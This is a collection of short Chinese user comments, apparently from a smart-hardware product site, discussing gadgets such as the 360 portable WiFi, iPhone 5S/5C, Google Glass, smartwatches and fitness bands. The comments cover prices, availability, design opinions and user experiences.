对挥动手势把警报关闭这个功能感兴趣，不知道动作识别是否有距离的限制？会不会有误判？
这个好强大
没想到Nest的第二款智能设备竟然是烟雾探测器 不过这个自然有它的道理 设计功能还是一如既往的简洁实用 虽然比起同类款贵上很多 但想起温控器的一代 还是会有不少人套钱包入手吧..期待11月发售
可以手动输入摄食量数据这项比较感兴趣，但是不喜欢它的外观和显示
可以追踪用户步行、卡路易数据并可以同步至电脑以及智能手机中，产品方便并且防水，可以连接至Fitbit强大的数据库中进行云数据处理。在目前算是少数能够买到的不错的计步器了。
额，，能不能便宜一点呢 哎
查了 据说15日发售..八百多
同问，这货啥时发货？？多少银子
到时何时发货 具体的价格如何？有没有后续相关报道
没想到空气净化器已经可以做到这种水准 可穿戴..看着样式像耳机但不知具体的试身效果如何 希望佩戴舒适度也能令人满意 之前的几款净化器还是不错的 对于现在的居家生活已经能被广泛接受了
晕菜~~已经下架了
成手机手表了　可以打电话等很方便　对着手表打电话　爽
智能手表现在还处于混战期，不知道什么时候会有一个行业的标杆
手表的外观和功能目前都已经到达一定水准 价格上其实拼不过多少 200-300美元上下..如果智能手表只向手机的方向发展那么很快就会被证明这不是一个正确的方向 起码我们不应该都堵在智能手机的外壳里面 智能手表有她自己的发展方向 如果找到这个方向 做出符合用户需求的产品 才是真正的考验..
对于母婴市场来讲 的确是一个细分市场需要挖掘 如何做到让用户在满意产品的同时扩大产品的使用度与影响力 也将成为这类产品能否立足的一个关键..
我好想要啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊？？？？？
这个好啊。很喜欢
爽 什么时候发售？？
很有意思的产品，也可以选择几款销量大的安卓机做这种定制的手柄，相信会吸引不少用户
乍一看去 真的很像是macbook一样 不过话说平板这样的设计作为电脑来讲也是行的通的..真有种“平板电脑”的感觉了
这款硬件的门槛不是很高，激光笔、摄像头和麦克风都很容易实现，我在想家里的宠物会不会把它打翻
就是在思考一个问题 如果无法让猫咪或宠物待在设别旁边的时候应该如何操作 毕竟这是个比较现实的问题..另外 会有宠物喜欢这个新型的设计感觉吗 他们能否接受还是产品的愿景美好
这个产品在哪里有买的？
这东西不贵啊，PS，咱们自己能把这些我要购买的变成一个预订的界面吗？然后定期组织团购。
想了解充满一次电能玩多久呢？不知道这样的产品何时才能出现在中国，用机器人来踢桌上足球不仅小孩子会喜欢，整天坐在办公室的人在工作之余来场“足球赛”也是不错的休闲方式。
这个设备太有意思了，“不插电”的iPhone外设，看完之后非常想自己组装一个，先去淘一个方形放大镜，再自制一个架子
准不准？有人实际用过么
真是 送老人的佳选~
马上10.13就是重阳节了 这款产品能上市了么 很想买一个送给姥姥..虽说智能不过很贴心实用
总体感觉这款产品还是不错的 性价比也能接受 如果作为赠给老人的爱心 使用起来又很方便的话我想应该是会有市场..
对于某些行业的人员来讲 还是相当实用的 赞一个！！
最远测距距离为180米，299美元的价格偏贵，另外，测量的准确度不知道怎么样，需求场景目前还想不太清楚，不明觉厉！
网上有DIY的
能不能提供试玩一下？
体感设备的体验目前来说还不是完美，敏感度和趣味性都有待提高，希望会有厂商来带给我们惊喜。另外，发现奇酷的产品更新越来越快了，赞一个！
进来的体感设备曾出不断 leap motion等为代表的智能硬件试图试水这块新天地 不过用户是否买账却不一定 智能设备带来的惊喜是我们欣喜看到的 如果可以寻找到一个合理的需求点最好不过。
一直想养些东西作为生活的调味剂 可繁忙的生活又不给一丝喘息 但看到这个 还是觉得温暖很多..如果科技的进步能给人们带来点什么 那应该是快乐 温暖 欢乐..
为啥一定要iPhone才行呢？？安卓可以的话该多好！！！！！！！
爱上单车电脑，可我的家里没有单车
对冲浪完全不了解，但是很看好智能设备在垂直领域进行细分，会有越来越多的小公司在一些细分领域做到极致，那时智能硬件就会真正改变我们的生活
外形看过来真是蛮不错的 我觉得这种智能手表如果说是面向某个方面的话倒是不妨一试 比如：冲浪、烹饪、驾驶、等等，而不是局限在手机上面，物联网的精神就是要联系生活事物 技术已经满足了 就看哪些厂商足够聪明明白这个道理..才需要
不错，我喜欢。不知什么时候才可以上市啊？
如果这翻译可以连上耳机 就完美了，毕竟 扬声器在大场合很小声o(∩_∩)o
好东西啊，买一个英语就不用愁了
健康问题真的应该引起大家重视 关注好身边环境已不仅仅是智能设备的产品需求 从人性化层面来说 我们的确应该利用好这些产品设备帮助自己
喜欢，LOVE~
很心仪的设计理念 智能的开发就应该让用户需要 说到底还是满足用户的需求 推出彩壳强拍摄等都是在 小范围做调整 如果硬件的更新已到一定地步 那设计的定制化必不可少
太爱脏了。
之前买了一个貌似是1代。。。
已经买好啦
可以买到吗
在家使用很满意 出去信号不是很强
苹果来了个土豪金，360随身wifi也来了个土豪金，360，真赶得上时代的脚步啊。
我用的是一代　速度挺快的全速下载　不过的离手机近信号好才快
为什么重庆没有卖？
要开着电脑很不好 ，关了电脑也能用就好啦。不过最近更新了驱动 可以管理网络，这点还不错。。我还是很喜欢的！！！
可以试用么？？？
要开着电脑很不好 ，开着电脑就可也用Cmd分线网络。论坛上有客户端破解方法，但不齐全。。。客户端大多要自己破解。。。。不过最近更新了驱动 可以管理网络，这点还不错。。我还是很喜欢的！！！
给我一个呗，试用一下，看看怎么样 哈哈！
非常好用，非常方便，让生活变得如此简单。
是要开着电脑的吧？
怎么插上去 怎么用不了 手机连接不上呀 一闪一闪的不稳定
好想试试360WIFI
插在电脑上，电脑需要开机么？？
我一直在用，真的很方便，比小米的好用多了
使用距离能更远一些就更好了
用这一代 是不是落后了 不知道有什么升级
家庭用有效范围还可以，只限40~70平方空间不计算墙壁。
我买了，范围只有15平方米
非常想要一个
就是想知道WIFI信号能达到多少米
貌似淘宝上买，更便宜！
信号能达到多少米
新春版买到了土豪金，不是USB口的，，是另外的一个口，，，
不错```
感觉不错 ！
能接收wifi就好了！！！
讨厌它的形状，希望精巧有质感，方中圆角。
不支持win8.1，这个还没跟的上
抢到啦！！
大家有没抢到彩色WIFI呢 哈哈 我可是辛苦买到了 期待！！
赞一个，希望有更多的颜色出来！
喜欢土豪金版，求购
功能不错，云U盘跟普通U盘类似，给电脑提供额外的存储空间，不同的是不占用本地空间，云U盘上的文件保存在云端的服务器上。只需把360随身WiFi 2代插入电脑，计算机就会增加一个盘符，双击打开即可访问里面的文件~
牛！有没有试用的
满足用户要求，能够从身边的坐起，奇酷品也需要大众化这样的商品赞
还是不懂啥意思！
这个应该不便宜才是
家里没地方= =。。。。
看着确实不错啊！！
新款的配置的确是升级不少 感觉苹果每次升级的性能提升都不会让人失望 这次也一样..无论是21.5或是27寸，寸处理器到显卡内存 十分看好
oppo 803 我用了三年。 oppo 值得信赖
OPPPO不错的，我用的907，看着这款不错想换他，苹果一个曾经对中国人不公平的手机真搞不懂有什么可夸的，再好也是垃圾
OPPO手机还是不错的 近几年我都使用的国产机 OPPO用了两个 现在用的是4月份买的部X909 到现在无任何问题 就是屏幕开着特耗电 4小时亮红灯 随便说说 拒绝做托 不信没人逼你！！
挺不错的 ，，， 下月买一个，不知道近期能调价不。
OPPO这个牌子的手机还可以，我也想买，就是太贵了，
这还没有苹果好 这个品牌没用过 也不相信你这个
哇真的好想买啊，就是太贵了
好想要~~~~
朋友们！一分钱一分货啊
好喜欢，只不过太贵了，好赶上苹果了。我和朋友们都在等降价。
看着真不错，刚买了部三星S4.早看到的话也许会考虑买。
价格贵吗？？？、
我正在用电池坑爹，12天？天方夜谭。机器不成熟。
国产手表真看得我眼花缭乱 就是到底哪个好呀，，
外观还不错，不知道量产的时候会不会有更薄的机身，待机12天半也是亮点，希望官方给一个实际使用的时间
好东西 这么看性价比超高！
这个长得挺逗的
这个价格 加上功能 对智能手表的走势没有起到丝毫作用啊。。
加上SIM卡会死啊
哈哈 互联网界的又一盛宴 离国家会议中心很近..有空前去受教
这特么不是中国火车上卖的小玩具么？难道老美没玩过？
挺好玩，价格合理，很想弄一个
特么还参考价格也没有，真尼玛坑！就是放这里让人看的。
说是说可购买，但是怎么购买啊？购买渠道都不贴一个出来。
没有热床？
刚看到这款产品就被他的产品发展思路所吸引 whitelabel不同于其他的硬件厂商 在讲究高新技术的同时 注重以后需求 将产品做到便携轻巧；灵便 并且超高的性价比是其最大的竞争力 如果按照其发展速度 在以后逐步推出新的超低价设备 相信会俘虏一大批粉丝用户
不过就是个表，有必要如此高端么
感觉这个Linkase 手机套 好fashion..还有这个功能 比起无线充电 这个增强wifi信号的功能如果能做好的话 相信会鼓动很多人买，，噱头很足 就是不知实际有没有效果了
这样的产品分类 可以有效的帮助用户查看相关类别的同类产品，，感觉很不错 希望以后可以做得更加详细 定期推出
很漂亮啊 如果可以在里面加一个类似手机卡一样的东西的话会更好。可以识别不同的人
图案要是可以定制就好了
是不是可以把芯片取出放在任意地方都可以用呢？
这个戒指的外观真心不好看，如果设计的足够美观可能会有市场
64位处理器意味着速度提升15%到30%，但并不能比32位处理器快一倍收费吧
home键是不是意味着小偷以后不会偷了~
iPhone 5S的64位处理器意味着速度提升15%到30%，但并不能比32位处理器快一倍。
iPhone 5C和iPhone 5S不够给力，苹果的产品虽然也在不断进步，但“爬楼梯”式的循序渐进已经无法满足消费者的期望――乔布斯为苹果树立起了以创新著称的招牌，但是这块招牌如今成了苹果的负担。
苹果小心翼翼地避免让iPhone 5C听上去很廉价，强调了它的出色材质和手感，但是它的价格高于很多分析师的预期，前段时间被误以为是廉价版，看这价格，哪里是廉价啊。
home键加入指纹识别还是挺酷的。
4活着，5却死了！感觉不会再爱了！
街机的节奏~
一早起来看微博满屏的吐槽，苹果还是底气十足的，人家就没想往低端走，只是国内猜测走偏罢了。苹果只是想出彩色系列，满足不同人的需求。5s还是很给力的，硬件升级，还有指纹识别
5C不考虑，5S除了不是大屏其他都很经典。64位处理器加协作处理器加指纹识别加OPENGL3.0，都是领先业内的先进技术，有入手的冲动。
当5下架，4、4S、5C、5S这条产品线就很清晰了！5C代替5去拓展中端，5S高端，4和4S面对低端用户！但是不管你买什么型号，只要是正版，都要进入他的系统生态圈，软硬结合，这盘棋下的好！
觉得还行，只是人们对苹果期望过大了，我觉得5c不错，5s更是进步蛮大，没有所谓的原地踏步，只是没以前发布的惊艳了！
感觉没什么亮点啊
看完感觉亮点不是那么多 5C的价格 还有5S的处理器 也就这么样两点了，，，
5C的价格是一大看点 会不会低于3000 我估计真不好说..另外 从市场角度看 苹果这次要抓渗透率了 不知有多少小厂家的日子越来越难过
让偶想起了刀剑神域
这个要是做出来就太帅了
很赞的高科技啊
很好不错。。
呵呵。。。
abcsds
看着简直酷爆了！！这个实物要是带上会是什么感觉呢..
小米电视老是自动重启 什么情况 有什么办法解决吗？求速度回复
有很多米粉说小米产品售后服务不好，这是怎么回事呢？
什么时候才能买到啊？老是没货。
播放不了3D视频，能播的又没有3D效果
嗯嗯，电视机不错，3D效果很强
看着还行，不知道售后服务怎么样？
这东西。。啥时候出？
这么小能存1000嘛？我很怀疑
有意思..
真好 以后再也不易担心存钱花了..
哈哈哈哈哈哈哈哈
哈哈 这个可以..以后吃饭的时候方便了 啥都能测
最近很关注这款手机，是因为在三星类似这样的顶级手机制造商不断更新产品时，魅族能够沉稳的走自己的路线，做出“有心”的产品，精益求精。同样为国产的小米的压力下，没有用过多的宣传推广，真正想凭产品打动用户的心，相对于小米的过多宣传，魅族则更是脚踏实地
整体感觉还是不错 黄章对产品的追求可想而知 虽说过后会有小米索尼三星等神机降临 不过我也觉得魅族还是相当有魅力的一只实力军..
这个东西拿来养花还不错
感觉不错 就是太贵了点 有没实用而且性价比高点的 跪求~~
太大了，如果是戒指大小的透明的也刚好可以卡在usb接口上就更好了
cool///
太贵了！！1137.7500元人民币
不算很贵哎
挺酷的..
虽然没看懂，不过我想，谷歌眼镜比你要好一点
感觉还蛮fashion的 有点像间谍 哈哈
这手表 竟然都有这功能了..要逆天
这样还真是蛮新鲜的 比起同质化严重的手表 抓住用户的一个需求点就够了..
不能自己移动，不能识别图形。
多少钱一个？
外形真Q~~
主要觉得这个产品的样子十分可爱而且 价格那是相当亲民呀..相信如果体验不错的话会很有竞争力
去了一天 感觉太爽了..看到很多最新的国内外厂商产品出炉 真的要说 国内智能硬件的发展已初具规模..
梦寐以求的产品 自从xplay后喜欢上了vivo的做工和设计 原以为只是以轻薄为噱头 但其实国产手机的质量和设计体验已经越来越出色..
有幸试完了以下 还可以 我喜欢拍照的那个功能！
这里的续航时间应该是指待机时间吧，实际使用估计撑不了两天，既然有个显示的屏幕为什么不价格时间显示呢？
外形够简洁 就拼价格了..
看这视频 觉得好神奇呀~~
真的有10000平方英尺吗，该不会骗人吧
外形像蝙蝠侠 哈哈
喜欢画画的飘过~~
据说必须要有三星手机才可以使用，有了解的吗？
大品牌的产品往往质量更让人放心 相对这个新兴的智能手表来讲 我还是更相信大厂牌的实力包括做工，毕竟不会差到哪里 小公司就不好说了..
不错 就喜欢~
看着不错，就是有点贵
看上去好高大上啊！！！
是太奢侈了。买这个块东西就为了称重量。不够大众化。怎么看也比IPAD贵。
这也太先进点了吧！！
无线的用处更大，你懂的。
话说这个有必要吗？
感觉是一个比较坑的产品，有人会买一个带摄像头的鼠标吗？
这个如果放在家里 是不是会可以放电影的感觉呢？求回复~
微投影仪的市场空间还是很大的，如果清晰度足够高、价格控制在1000元之内，还是有很多人愿意买的吧。个人感觉家庭的需求会比较大，躺在床上看大屏幕电影还是很爽的一件事
不错的！好东西
等苹果的创新设计,真的是很有头脑..
看上去还可以，期待吧！
上市就购入了，一直在用，拍照可以说没有什么对手
虽然专业级产品市场较小，但是Lumia 1020对Nokia这家老牌手机厂商的意义却非常大，让我们看到了Nokia依然有创造出世界一流手机的实力，产品是好的产品，无需在这里赘述。但是我只能感叹这款产品生不逢时，高端智能手机市场已接近饱和，众厂商目前都在中低端市场上发力。5000多的价格是否会吸引足够多的用户为其买单，让我们拭目以待
不得不说nokia的拍照技术真的太强了 那天试了同学的lumia920，拍照效果真的相当惊人，佩服，这款堪称史诗级的酷品，如果价格再低一点的话就好了~
好玩我喜欢
不知道敏感度会怎么样，试用过leap motion，手臂举时间长了确实会发酸，这款设备确实很好解决了这个问题，希望体感设备会越来越强大
这个东西确实很不错。有想买的冲动。
很喜欢这个底座的造型，从视频里面看，操作的灵敏度还可以，转动也比较灵活，应用场景也比较普遍，很想买一个来玩玩
看着设计还是蛮fashion的 希望功能上能有所突破 现在这类手机配件种类很多 同质化也很严重 而有特点的真的很少..
赞。创意要快快成为现实。
比我以前买那个巴克球 更fashion啦！
这种模块化的机器人能激发出很多新奇的想法吧，值得期待！
国内什么时候能有类似的东西呢，感觉
国内什么时候能有类似的小玩意呢，这种模块化的机器人应该会激发出很多新奇的想法
确实很酷！ 哪里有卖的？
众筹 就是产品正在雏形阶段 目前已完成初步设计 但距离量产及规模化还有一定距离 希望对你有所帮助~~
众筹中是啥意思？
感觉很不错，很好看，应该效果不错，我支持他，希望能尽快买到
好玩~来哦一个试试
样子要在cute点就好了 可以考虑出个彩色版或换个壳
窄边框好，iPhone没边框还能看么？
摔哪都会碰到屏幕..
就喜欢窄边框或者无边框的 我觉得设计越扁越好~
很不错。这个造型配合ios7界面简直就是浑然天成！
喜欢这个设计，要是有一天iphone真的设计成这样，国内的贴膜厂商应该会很开心，但是手机保护套会变成什么样子呢？
看着不错！期待产品！
确实不错！！
这个概念不错，但是其他的功能键放在那里，屏幕会不会很容易划。
看着确实不错。 期待苹果每次都能超出大家的预期很多！
如果是Wacom出品的就赞了。
还不如把触摸板改为手写板
感觉不是很好！
我感觉这个触摸板，设计的没什么用处的！
这块不错..罗技在鼠标键盘领域真的很强大
@ Stefan, 麦步现在推出了android测试版本，如果有需要请通过麦步微信公共平台索要链接。正式版本很快上线，敬请期待。
相当fashion 不知有没有android版本 送一个给女朋友..
这样的门铃会不会丢
感觉着小东西还不错 就是价格上再3合理点就好了 放在国内开发应该是捷径..
5500这是要疯了的
这个性价比挺高的
相比IQair 这款我觉得更适合放在家里 虽然功能参数都差不到太多 不过性价比看起来还是蛮高的..
什么时候才能买才是关注的重点！
看到这个，让我第一个想法就是，哇塞，科技的力量太强大了！这完全改变了人们对于健康的观念，现代人都定期去检查，衣食住行更关心自己的身体，而这么个东西，能够极大程度的使人们对于自身的观察保护！10秒钟，可能每天起床第一件事就是花费10秒钟去关注一下自己，相比JAWBONE UP 2智能腕带而言Scanadu Scout 智能健康扫描仪能够更全面的跟便捷的告诉你，你现在怎么样了！傻瓜式则是广泛化最重要的
这个买了放家里很实用，外形很喜欢，什么时候能购买啊
不错啊，呵呵
价格比百度还贵
百度影棒跟这几乎一样啊，谁抄袭谁
外形设计不错 不知具体性能参数如何..
依仗强大的X8处理器 性能上绝对是高端机水准..配置没有问题 外形设计也不错 很像HTC One系列..如果价格更加亲民的话 相信会有一大波强力粉丝群体（PS：据说下半年会出廉价版 拭目以待~）
是啊，有更详细的参数吗？
有详细的尺寸参数吗？想看看到底有多小
感觉就是使用时间、续航能力。在后面不是容易被盗取。
后面那一块是不是有点障眼？
这个戴起来会不会有一点怪怪的 想法不能强驾驭用户身上 所以我觉得还是观望下算了
不喜欢这个外观，个人感觉外界声音和高质量的音乐不可兼得，在户外可能有一些实用价值吧
英文估计可以，就26个字，但中文可能难以识别了。
这个是不是不支持在中国卖，为啥视频没有中文
这东西应该不支持中文，中国谁来搞一个
再也不担心写错字了
哈哈，有点意思
科技的神奇力量，有我能带给我们更多的惊喜。
fdsafdsa
真是越看越喜欢啊
很喜欢这种有创意的产品~
这是一个非常前卫的相机啊！！！！
希望在不久以后，高性能相机也能DIY
外形设计的不错 很有心仪..
蛮有意思的啊
360儿童手表不就要上来了么？还买老外的干嘛？
难道不怕小孩把它摘了么.>是不是要考虑下使用场景？
产品外观和app界面都是我喜欢的风格，但是针对国外用户的产品到中国肯定都有些水土不服，希望中国很快就有这种类似的产品，需求还是蛮大的
说的的确 如果孩子将手表遗弃或丢掷 再强大的功能可以也不能完全保证其安全行为 但产品的初衷是尽可能防止用户这种行为以及给家长以安全提醒 如何做好产品与用户之间的过度很重要..安全的行为不能仅仅是产品本身全部的责任 家长及用户本身也是产品能否成功胜任的因素之一
孩子要是把手表放教室人跑了怎么办~
宝贝不存在
什么时候中国能造出一个来？我想要
宝贝不存在
太酷了！google的产品越来越有创意了。
拍立得一样的相机..不错.
很稀饭啊~~精致小巧~~
Instagram 爱好者的毒物
很不错的照相机啊
很有创意啊
这款智能设备真的很不错，不知何时能进入市场。
如今的智能设备越来越往前发展 感觉这款无论从设计还是系统配置上 还蛮不错的
造型有点像空气净化器
非常有创意
如果能把一边做成全屏，另一边做成像黑莓那样的全键盘加一块小屏的模样，我想手机的应用性可能就更好了，而且一块小屏也没有那么耗电了,最主要的是不会让喜欢全键盘手机的使用者纠结于是选择全屏手机还是选择全键盘手机了，一举两得！...
看书还是墨水屏好！
简简单单的创意，整合了一些最基本的功能，却着实方便了每一个使用者。好的，优秀的产品并不是功能多么全面，多么繁多，而是有效合理的使用，有效合理的交互，几个简单的功能，能够切实有效的解决毛巾卫生问题，以及使用舒适程度，所以说是一个笨想法，好创意，够实用！
哇哦 七夕送这个 很实用呀~
不知道多少钱啊？
能过门槛么？特别矮的那种门槛
好难看……
是蓝牙耳机吗
希望美化一下
样子不好看
我觉得没什么用。手机的天气软件不是都能预报吗？还有，视频里那男的出门第一件事，竟然是将这个玩意插上，然后查看温度，才放心的上街，我和我的小伙伴都惊呆了。。。WHY？没有任何依据的行为，很奇怪，不过对设计产品的工匠精神还是值得肯定，只是产品定位不清晰，没能捕捉实质需求。
小巧的外接设备，通过耳机插口与手机连接，极其方便！可以随时随地掌控当前的温度变化，更强的是可以预测未来天气的变化趋势。苹果、安卓系统的设备都可以完美兼容，想不想入手一台呢？
aazzzzzz
我拜托看看购买链接吧。。。
Leap Motion目前还不是一款成熟产品，传感准确性这类硬件问题将来都可以得到解决，但是真正能影响其未来的还是它的应用程序商店Airspace，希望将来会有更多的应用来让我们自由控制屏幕上的东西
微软的噩梦
挺好的，质感不错
很酷的体感装置。。
体感就是未来的趋势啊。灵敏度是非常关键的指数啊！
便携随身的小部件 近来可谓是越来越火了..这款也相当不错 外形设计很出彩
很有创意啊
2000左右，你闹哪
酷！！期待价格
看外形的确是很酷的杰作..论设计及功能音质 也是没得挑的 如果价格再降一点的话想必一定会吸纳更多爱好音乐及家具娱乐生活的人们
1999钛贵了
智能手表如雨后春笋般涌起 真是不可小觑..
可不可以只买灯呀？？？
真的是好薄啊
购买链接出错了。。
对身体有益，感觉挺不错的。而且比jawbone up 2便宜多了。。作用差不多，还便宜，要买一定得买这个，支持国产啊。
对于咕咚手环还是比较期待的，毕竟其299元的价格相对jawbone up 2便宜太多了，但是在监测的准确性上还是让我有些顾虑，上市的时候应该会买一个来玩玩
好酷！期待有一款这样的产品
记得很久之前前看过这么个东西，感觉相当新潮相当给力，于是在网上找到了王自如的ZEALER中国的评测，发现的有点不少但是也有相应的问题，激光键盘理论上携带方便，使用简单，但是实际上手会发现，对于环境的要求比较高，不如蓝牙键盘，而且感应会有所欠缺也是应该改进的地方，相比传统键盘对于文字输入切换比较麻烦需要进一步的连接，最基本的打字，每分钟会比普通的差很多，但是概念必将是新潮的，希望缺点也会随时间而改进
怎么看起来是个开锁的， 我待着可以随便打开别人的手机？
有什么用啊/
市场现在的路由器都是以几十元为主，这款就是价格是不占优势。
看不出哪里划时代。。
太贵了。不是说加个壳子就可以这么贵
这个很实用，可以考虑给家人买一个
感觉还蛮实用的 回头买回去看看..
评论到哪里去了啊？
这个可以防止出轨，老公不回来看一下，妈的，XXOO的姿势啊。。。
厉害！可以打电话、短信，还可以拍照及时分享，太牛了
厉害！可以打电话、短信，还可以拍照及时分享，太牛了
怎么没有价位啊
你确定这是腕表？你确定这是手机？我只知道这是个可以打电话的手表。。。。带上它我也可以去拍科幻片了
wow，好棒！可以打电话、短信，还可以拍照及时分享。也可以用作跑步时的记录器，比苹果还牛。快卖，我要买一个！
防水性能怎么样？支持国产，之前准备入手smartwatch2，防水性能不好就没买，希望这个给力啊
价钱!!! 放水性能！！！
看上去很有吸引力！
价格适应是硬伤
不错，卖多少钱
关心售价！！！
今天什么时候发布啊，看到谍照感觉还不错啊！就是不知道工作状态待机如何？ inwatch的人在不在，给解答下啊！！！
很期待这款国内智能手表，据说inwatch团队最耗时完成的部分就是外观的设计，从图片来看外观还是不错的，在这么小的屏幕上应用的展示和交互的问题也似乎得到了很好的解决，不知道对语音支持的准确度会怎么样
亮点是具备智能手机的功能，可打电话、短信，还可拍照及时分享，另外其它辅助功能也算比较丰富，总的来说功能还是蛮强大的，就看到时售价如何..
这款智能终端算是我见过硬件设备里很小的一款 外形很轻盈 携带便捷..现在的课穿戴设备主要就是外形、便携性以及实用性，从这三点来讲，这个小玩意基本都有满足，如何日后价格能更加亲民的话 相信会有更多用户人群..
不错的相框，就是贵了点。
这种为家庭而设计的产品理念的确很棒，多少远在家乡的老人想看到子女的近况，这样一款设备很好解决了这个问题，过年回家的时候带一个这玩意儿比脑白金之类的东西意义大太多
可以考虑给姥姥买一个~
好酷的一个产品。有点冲动入手一台。
这种产品功能比较单一，且不怎么实用，建议增加车速等功能，增加实用性。
有意思的产品，很有市场前景，二氧化碳浓厚的现代城市，自行车是一些人喜爱的，而常骑自行车的人夜间“寸步难行”不像汽车对于地面的容错率低。这款产品从两方面都很好的处理了这些问题，既能帮助骑行者感受前行的路面信息，又能提示路人车辆这里有自行车骑来，能够很大程度的保证骑行者的安全，我想这也正是作者为骑行的人切实的考虑，如果上市的话，我会购买这样一款产品的！
2000你闹哪
好东西啊，就是有些贵了
朋友买了一个，我负责的说很爽，使用带陀螺仪的手机遥控，感觉很爽，很受控，就是很听话。带摄像头，可以高清720p录像，录像效果也很有感觉。绝对不是那种几百块钱的小飞机的感觉，当让除了价格贵点，推荐买。
有同事买了一个，很好玩，就是电量消耗的太快了
希望得到一台这样的东西哦，呵呵呵
相信如果别的东西的评测还有所欠缺，没有具体实际的操作的话，这款设备使用一段时间的我能说上两句，小米盒子从定位上就是网络电视机顶盒，所以对于硬件设备于乐视tv有所差距，但是现实生活使用完全能够担当责任，而这种设备要从软硬件方面来探讨，官方的软件处于研发初期还不完善，但是对于使用体验已经做的相当好了！而开源的基础android也成就他能安装其他的平台，例如泰捷TV，完善它资源的欠缺和对于网络电视直播方
面的弊端，这也正是我看好小米盒子这款设备的条件之一，发展初期的盒子视频源少，但是质量确是1等1的，也就是说，虽然安装别的视频软件，但是对于盒子本身的小米视频不是随意扔弃，而是期望很深！另外小米盒子是小米手机的最发烧配件！从这句话来看，他必定能和现代的只能手机有着默契的配合，而现实也却是如此，值得令人夸赞。小米盒子我对于他未来的期盼很多，设备也将越来越完善，一个不断发展不抛弃的公司他们的产品是
值得令人期盼的！
节目资源太少是致命弱点啊！
不得不说小米在硬件上的发展 在国内算是首屈一指 从智能手机撕开市场开始 陆续逐渐由新的硬件产品研发、设计并发布更新，希望越做越好
这玩意真的不错，唯一的遗憾也是最大的致命点就是它自身的寿命
JAWBONE UP2我认为是最体现人性化的产品，聪明的设计随身携带，同时酷意十足！2代的防水开机等都是在1代的基础上成功的设计，跟贴合产品对于人性化的设计，使使用的人有了跟方便更舒适的体验，一款这样的伴侣会使人有了计划，有了提醒，这正是现代生活当中最实用与贴心的需求！同时个人感觉携带这个不但不会被他人看做另类反而使人感受使用的人到对于生活的细心与对时尚的追求。
好吧，不怪编辑了。这是产品的事。拜托，别把购买和预订写出来，这个事要让老周知道，嗨。。。
如果购买连接不好就别把页面设成固定在右侧，丢人！从首页上扯下来吧~
编辑，你测试链接了嘛？京东还卖嘛？怎么放到首页的产品还有这样的问题？！这么低级的问题！！！！！！！
想买一个来玩玩，就是太贵了，等咕咚手环吧
不知道要多少钱！！5000一下可以考虑
好喜欢啊 可是太贵了…… 看来贫穷是硬伤啊
近视版什么时候上市
好酷，可是太贵了，只能攒钱了，哎！高科技，穷人伤不起呀！
确实代表了当前最牛的技术了，舒适度，显示器的位置，语音辨识等体验上还有很多上升空间
超级NB的科技产品啊
对近视的同学是一种摧残啊。。。大略明白了所谓的“投射到视网膜”的技术：眼镜里柄里有一个小显示器，玻璃块中间有个半透明镜，尽头是个球面。所以，戴着眼镜，从半透明镜看到经球面内面放大的屏幕；如果反过来看的话，就是从半透明镜看到原始的小屏幕。
刚拿到货 那是相当拉风啊， 马上吸引众多目光， 无数MM的崇拜的眼神， 到哪都是焦点啊， 泡妞利器啊。
视频看着不错，就是制作得太一般了！
有幸试戴了以下 感觉相当拉风..不过体验上还有待改进 相信最终版本会有一定程度提升
这个是目前最值得期待的穿戴设备，不知道google会在电池的问题上怎么解决
我用着那，挺好用，省了不少钱。
最好连电脑都不需要那一定火
这个随身wifi太帅了
这手表太帅了。
准备来一打儿送人
终于开放购买了，大家快抢啊
恭喜一下啊啊啊啊
听说有要发售了
已有两个白的~想要一个黑色的
很好用，顶一个
手机以后再也不怕没有网了。赞
不支持VPN
不错的，挺好的
那天11点抢到了，15点竟然到了，当时我就震惊了，居然这么快，赶紧体验了一下，实在是太方便了。而且，本来连着联通的WIFI是不能发WIFI的，但是这个小东西居然解决了这个问题，实用。不过，360安全卫士里也有个发WIFI的，不知道两者的区别在哪？
这个首先颜色不错，插上电脑，可以躺着玩，坐着玩，想怎么玩就怎么玩，物超所值( ⊙ o ⊙ )啊！
一直想要！
不错的产品 物超所值 喜欢
小玩意儿 上手体验不错..蛮实用的 抢了一对黑白配 嘻嘻~
饥饿营销，十分无耻
妈妈再也不用担心我没有无线网了，so easy！
前几天抢到的随身wifi，这小东西配置确实简单
将近4000元的 有三个规格
价格550美元，再加运费600多元，真的好贵
好帅的手机/
看不到价格怎么预订？
这沙发座的，贵不贵 ，RMB在多少价？
什么价格?
40流明？是不是只能在黑屋子里看呀？
真心感觉的不错，
这个不错，我很喜欢
在家里直接插电源充算了
搞笑 13个小时。。
喜欢！设计很简约也很可爱！撕裂感就撕裂感吧！
看了一下价格好贵的啊。。。
手机丢了怎么办。。。
多远距离都可测到吗？或有效距离是多少？
像柯南君的.......
好棒，我喜欢
so Q~~ I love it~!
如果手机跟钱包都忘记了怎么办.....
觉得这个挺好玩，想买一个放在办公桌上
体验过两天黑色版pebble，总的来说有一定的实用价值，手机放在包里走路的时候不再担心漏接电话了，只是不支持中文，所有的汉字都显示为小方块，后来在google play 下载了一个名为Pebble Plus的app，可以把中文短信内容转成拼音显示，虽然有些山寨的感觉，但至少是能查看了。外观方面比想象的好很多，虽然是塑料机身，但是戴在手上还是蛮时尚的
平凡的外表却有着不平凡的功能，真是手表世界的king
很喜欢，国内也可预订吗？
对于August Smart Lock 智能门锁这款“设备”而言，安全性毋庸置疑是最主要的前提！但是看到介绍感觉对于安全性能方面做的还不错，可是以个人看法而言，对于现在防盗防贼如此严峻的问题，这款“设备”能不能真正的发挥它的方便，安全等性能还有待实践和时间去测量，可以先从办公室等开放地区测试，能更方便人们日常的工作生活！有个想法，关于蓝牙密匙可以运用类似将军令等时间随时更换有独特算法可能会更安全！
比起指纹门锁，没觉得有啥超越之处……
太玄了可能很贵
盘子太小，有木有！
这打LOL一激动跑出去了，怎么防止出界?
这个好神奇啊！%3
看到的第一印象都会说，哇好神奇，这也确实神奇，相信极客发烧友会装备这样一款回头率百分之一万的设备，当然它也是有局限性的，例如：限制在一个小范围，长时间使用手臂会否比较累，不同重量之间的人使用压力不同，会否使指针不如现有设备准确等诸多问题。当然，前景或许不错，不过对于玩游戏的人群可能不太适合吧！
599.00，呵呵，你闹哪
不知道做个东西的耗电如何？
这个产品非常好，赞一个
非常好的产品。赞
据说fitbit flex监测的数据是所有手环里最准的，最近想买一个来玩玩，有用过的朋友吗？过来说说
